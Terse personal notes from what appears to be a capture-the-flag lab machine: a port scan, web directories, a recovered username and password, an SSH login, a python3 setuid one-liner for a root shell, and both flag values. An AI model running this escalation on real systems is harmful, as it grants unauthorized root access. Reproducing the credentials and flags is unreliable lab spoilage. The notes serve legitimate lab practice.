IP:- 10.10.10.245

namp:-
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    gunicorn

Dirs:
	/ip
	/data/
	/netstat





From ip/data/0
I have to download the network file!! 
then inspect it!!
there is an FTP service!



USER:- nathan
PASS:- Buck3tH4TF0RM3!


ssh on:-  ssh nathan@10.10.10.245
	user_flag:- 14bad84aeb4d9d0e4dcaf6e47f4e130e


root:x:0:0:root:/root:/bin/bash -> permission dey nah :(
	RS- python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

	root_flag:- cfa83f0f55e63bec1ead8f66a742837f